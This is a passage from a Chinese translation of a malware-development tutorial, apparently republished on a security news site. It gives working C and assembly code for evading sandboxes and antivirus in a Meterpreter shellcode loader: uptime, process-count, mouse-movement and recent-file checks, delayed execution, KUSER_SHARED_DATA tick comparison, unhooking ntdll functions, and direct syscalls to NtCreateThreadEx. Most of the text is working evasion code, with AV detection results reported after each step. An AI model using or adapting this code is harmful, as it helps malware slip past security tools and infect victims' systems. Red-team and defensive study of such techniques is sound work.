    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, 0);
    DWORD responseLength;
    WinHttpQueryDataAvailable(hRequest, &responseLength);
    PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
    WinHttpReadData(hRequest, response, responseLength, &responseLength);
    if (atoi((PSTR)response) != 1337) return false;
    

结果（没有IP IoC）：

![](https://p5.ssl.qhimg.com/t01093409e04aaed1d5.png)

这个方法也可以使用HTTPS，DNS或其他网络协议。

###  用户交互

只有选定的沙箱可以模拟用户交互（比如点击弹出窗口）。我们可以在执行恶意代码之前弹出一个消息框：

    
    
    MessageBoxW(NULL, L"Just click OK", L"Hello", 0);
    

![](https://p2.ssl.qhimg.com/t011a4ed98d2d144efc.png)

事实上，`MessageBox`函数会根据点击的按钮返回一个值。我们可以使用其他参数创建更多的按钮，并且只在点击某个特定按钮时才继续执行。但是，这种方法必须假设用户会点击正确的按钮。而且我们可能也不希望用户在程序运行的时候看到任何信息。

    
    
    int response = MessageBoxW(NULL, L"Do you want to restart your computer now?", L"Restart required", MB_YESNOCANCEL);
    if (response == IDYES) return false;
    

![](https://p2.ssl.qhimg.com/t01016e295a34a07829.png)

这种方法可以绕过一些反病毒程序，但是MS Defender依然可以把它识别为“ Meterpreter trojan”：

![](https://p1.ssl.qhimg.com/t0174483a501141e81c.png)

接下来，我们使用包含具体数值的用户互动，例如等待用户将鼠标移动特定的距离。
对于一般用户来说，这个过程可能需要一两分钟，但沙箱可能需要更长时间（希望可以超过为模拟检测分配的时间）：

    
    
    POINT currentMousePosition;
    POINT previousMousePosition;
    GetCursorPos(&previousMousePosition);
    double mouseDistance = 0;
    while (true)
    {
        GetCursorPos(&currentMousePosition);
        mouseDistance += sqrt(
            pow(currentMousePosition.x - previousMousePosition.x, 2) +
            pow(currentMousePosition.y - previousMousePosition.y, 2)
        );
        Sleep(100);
        previousMousePosition = currentMousePosition;
        if (mouseDistance > 20000) break;
    }
    

这次只有MS Defender（“ Meterpreter”）检测到该程序，VirusTotal的沙箱没有提取IP IoC：

![](https://p2.ssl.qhimg.com/t01b5a8ca4b6e726145.png)

###  之前的用户交互行为

沙箱可能没有之前用户与系统交互过程中产生的相关记录，比如说最近访问的文档列表可能没有任何内容或者内容很少。我们可以访问`%APPDATA%MicrosoftWindowsRecent`文件夹并计算其中的文件数量：

    
    
    PWSTR recentFolder = NULL;
    SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);
    wchar_t recentFolderFiles[MAX_PATH + 1] = L"";
    StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
    StringCbCatW(recentFolderFiles, MAX_PATH, L"\*");
    int numberOfRecentFiles = 0;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            numberOfRecentFiles++;
        } while (FindNextFileW(hFind, &findFileData));
    }
    if (numberOfRecentFiles >= 2) numberOfRecentFiles-=2; //exclude '.' and '..'
    if (numberOfRecentFiles < 20) return false;
    

这个方法很有效，只有一个反病毒软件（AV）标记了该二进制文件（suspicious）,没有提取出IP IoC：

![](https://p4.ssl.qhimg.com/t01e0b27b3d041a2d76.png)

###  正在运行的进程数量

因为沙箱环境的资源有限，它可能会把允许运行的进程数降到最小。假设一个普通用户正常情况下至少会同时运行50个进程，遍历所有正在运行的进程：

    
    
    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesCountBytes;
    DWORD runningProcessesCount;
    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
    if (runningProcessesCount < 50) return false;
    

VirusTotal没办法从该二进制文件中提取出IP IoC：

![](https://p4.ssl.qhimg.com/t01ab59145ca0b2068c.png)

###  已运行时间

在沙箱中，系统的已运行时间可能很小，特别是如果每次分析文件时才启动虚拟环境。 我们在代码中使用64位的函数，因为常规的`GetTickCount`函数会在2
^ 32毫秒（497天）后溢出：

    
    
    ULONGLONG uptime = GetTickCount64() / 1000;
    if (uptime < 1200) return false; //20 minutes
    

同样，MS Defender检测到了该程序，Cylance把程序标记为了“unsafe”，沙箱没有提取出IP IoC：

![](https://p2.ssl.qhimg.com/t017992e6e001dabf01.png)

###  延迟执行

延迟执行可能会超出样本执行的时间限制，从而绕过沙箱分析。但并不是使用`Sleep(1000000)`语句就可以了， 沙箱可能直接加快函数的执行。

我们可以检查睡眠前后的系统已运行时间，也可以使用较低级别的用户空间API进行延迟（这样被AV发现的机会要少一些）。这么做需要动态获取函数地址，下一篇文章要讲到的API调用混淆会广泛使用该技巧。此外，`NtDelayExecution`函数使用的时间参数格式和`Sleep`不同：

    
    
    ULONGLONG uptimeBeforeSleep = GetTickCount64();
    typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * 100000; // 100 seconds
    pNtDelayExecution(FALSE, &delay);
    ULONGLONG uptimeAfterSleep = GetTickCount64();
    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
    

分析结果：Cylance标记为“unsafe”，沙箱没有提取出IP IoC：

![](https://p4.ssl.qhimg.com/t01993773cdb88113ff.png)

####  Kernel-user shared data

一些复杂的沙箱可能会劫持`Sleep`函数（甚至是内核模式的`ZwDelayExecution`函数；但是我认为，现在内核劫持需要管理程序级别的访问权限）和`GetTickCount64`函数（或内核模式的`KeQueryTickCount`函数）。我们可以使用[`KUSER_SHARED_DATA`](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kuser_shared_data/index.htm)
结构，该结构由系统内核（以只读模式）共享给用户模式使用，而且也包含有关“tick
count”的信息。这个结构始终位于内存中的同一地址（`0x7ffe0000`）。真实的系统运行时间（`KSYSTEM_TIME`结构）存储在偏移量为0x320的位置上。
我们可以直接从系统内存中读取该结构，并用它来检查沙箱是否控制了和tickcount有关的函数：

    
    
    Sleep(1000000);
    ULONG *PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG *PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG *PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD time = GetTickCount64();
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    if ((time - kernelTime) > 100 && (kernelTime - time) > 100) return false;
    

###  函数劫持（hooking）

AV、EDR或者沙箱都可以劫持特定函数（经常在恶意软件中使用的函数，例如用于代码注入的`NtCreateThreadEx`或用于内存读取的`NtReadVirtualMemory`，尤其是在`lsass.exe`转储用户凭据的时候）。如果函数被劫持，它的第一条指令通常会被覆盖成一个跳转指令，跳转到外部库中的另一个函数，从而进行进一步检查以恶意活动并决定是否阻止其继续运行。接下来看一下如何检测和修复函数劫持。

####  检测并修复函数劫持

我们可以检查函数的汇编字节中是否有任何劫持迹象（例如`call`指令或`push`和`ret`指令的组合）。但还有一个更好的方法：我们可以比较加载到内存中的函数指令和硬盘上的`.dll`文件内容。
接下来用`ntdll.dll`中的`NtCreateThreadEx`函数做一个示范，看看如何获得dll文件内容。我们打开硬盘中的库文件并将其映射到内存，然后在它的头部寻找输出目录的相对位置，接下来，遍历存储在`AddressOfNames`数组中的函数名称，查找“NtCreateThreadEx”这个名字（[要找到实际的代码位置，需要遍历`AddressOfNameOrdinals`数组](https://resources.infosecinstitute.com/the-export-directory/)）。

    
    
    // manually load the dll
    HANDLE dllFile = CreateFileW(L"C:\Windows\System32\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dllFileSize = GetFileSize(dllFile, NULL);
    HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(dllFile);
    
    // analyze the dll
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);
    
    // find the original function code
    PVOID pNtCreateThreadExOriginal = NULL;
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
        PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
        if (!strcmp(pFunctionName, "NtCreateThreadEx"))
        {
            pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
            break;
        }
    }
    
    // compare functions
    PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
    if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;
    

现在我们模拟一下`MessageBoxW`被劫持后立即返回的情况（使用操作码C3，表示RET函数）。我们想要检测劫持，并使用硬盘上dll文件中的原始汇编代码对函数进行修复。如果我们想执行“黑名单”中（或带有被禁止的特定参数）的函数时，这种方法很有用。

    
    
    // function hooking - usually done by AV/EDR/Sandbox
    // this assumes that user32.dll is loaded into the process' address space
    PVOID pMessageBoxW = GetProcAddress(GetModuleHandleW(L"user32.dll"), "MessageBoxW");
    DWORD oldProtect;
    VirtualProtect(pMessageBoxW, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    char hook[] = { 0xC3 }; // ret
    memcpy(pMessageBoxW, hook, 1);
    VirtualProtect(pMessageBoxW, 1, oldProtect, &oldProtect);
    
    MessageBoxW(NULL, L"Hooked", L"Hooked", 0); // won't show up
    
    // detect and fix the hook
    PVOID pMessageBoxWOriginal = LoadDllFromDiskAndFindFunctionCode(); // see the previous code snippet
    PVOID pMessageBoxWHooked = GetProcAddress(GetModuleHandleW(L"user32.dll"), "MessageBoxW");
    if (memcmp(pMessageBoxWHooked, pMessageBoxWOriginal, 16))
    {
        DWORD oldProtection, tempProtection;
        VirtualProtect(pMessageBoxW, 16, PAGE_EXECUTE_READWRITE, &oldProtection);
        memcpy(pMessageBoxWHooked, pMessageBoxWOriginal, 16);
        VirtualProtect(pMessageBoxW, 16, oldProtection, &tempProtection);
    }
    MessageBoxW(NULL, L"Fixed", L"Fixed", 0);
    

####  直接进行系统调用

我们还可以使用另一种方法绕过用户模式下的API劫持，就是直接进行系统调用。首先，先使用Process Monitor分析一下我们的简单恶意软件。

回顾：该可执行文件注入shellcode并创建新的线程执行该shellcode：

    
    
    HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    

Process Monitor捕获到了线程创建事件：

![](https://p3.ssl.qhimg.com/t014bbc8b7814ae6c48.png)

从图中对`NtCreateThreadEx`的调用可以发现代码调用了`CreateThread`函数。接下使用CPU指令`syscall`，执行切换到了内核模式（ring
0），该CPU指令的[syscall
ID](https://j00ru.vexillium.org/syscalls/nt/64/)存储在了EAX寄存器中。

![](https://p2.ssl.qhimg.com/t0106f541c1f3b22caa.png)

如果`NtCreateThreadEx`函数被劫持了，那么在调用这个函数或其他更高级别的函数（如`CreateThread`等）时，我们就可能无法到达`syscall`。但是，我们可以通过直接从代码中生成`syscall`来绕过劫持，我们要做的就是把所有函数参数压入堆栈（可用C语言完成）然后调用`syscall`（使用汇编）。

首先，我们需要用汇编语言定义`NtCreateThreadEx`函数并将`.asm`文件添加到项目中。同时确保项目的“ Build
Customizations”选项中包含了Microsoft Macro Assembler文件。

    
    
    .code
        NtCreateThreadEx PROC
            mov r10, rcx
            mov eax, 00bdh
            syscall
            ret
        NtCreateThreadEx ENDP
    end
    

然后在源代码中声明该外部方法：

    
    
    EXTERN_C NTSTATUS(NTAPI NtCreateThreadEx)
    (
        OUT PHANDLE hThread,
        IN ACCESS_MASK DesiredAccess,
        IN PVOID ObjectAttributes,
        IN HANDLE ProcessHandle,
        IN PTHREAD_START_ROUTINE lpStartAddress,
        IN PVOID lpParameter,
        IN ULONG Flags,
        IN SIZE_T StackZeroBits,
        IN SIZE_T SizeOfStackCommit,
        IN SIZE_T SizeOfStackReserve,
        OUT PVOID AttributeList
    );
    

调用该函数：

    
    
    HANDLE hThread;
    HANDLE hProcess = GetCurrentProcess();
    NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, FALSE, NULL, NULL, NULL, NULL);
    WaitForSingleObject(hThread, INFINITE);
    

这样，我们就绕开了用户模式下对WinAPI的线程创建函数的所有劫持行为。但是我们在代码中硬编码的syscall
ID（`0xBD`）是针对特定版本的。如果想要支持不同的Windows版本，我们需要列出所有syscall
ID并动态检查系统版本。这里就要使用[SysWhispers](https://github.com/jthuraisamy/SysWhispers/)工具了。
我们可以使用这个工具生成C语言的必要函数和类型定义以及汇编语言的系统版本检查和syscall定义。

## 总结

在本文中，我们分析了各种恶意软件用来进行沙箱检测，虚拟机检测和自动分析检测的流行方法。

在下一篇文章中，我们会介绍多种调试器检测方法，并讨论如何让对我们的已编译代码的调试更加困难。

## 链接

请确保你查看了下面这些和此次主题有关的资源：

<https://github.com/Arvanaghi/CheckPlease>

<https://github.com/LordNoteworthy/al-khaser>

<https://github.com/a0rtega/pafish>

<https://github.com/CheckPointSW/InviZzzible>

<https://evasions.checkpoint.com/>

<https://github.com/hfiref0x/VBoxHardenedLoader>

<https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/>

<https://github.com/jthuraisamy/SysWhispers>

<https://github.com/j00ru/windows-syscalls>

<https://ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs>

本文翻译自0xpat.github.io
[原文链接](https://0xpat.github.io/Malware_development_part_1/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **zoemurmure** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/204322](/post/id/204322)

安全客 - 有思想的安全新媒体

本文转载自: [0xpat.github.io](https://0xpat.github.io/Malware_development_part_1/)

如若转载,请注明出处： <https://0xpat.github.io/Malware_development_part_1/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)

 **+1** __17赞

 __收藏

![](https://p1.ssl.qhimg.com/t0148810f786e0f31fb.png) zoemurmure

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

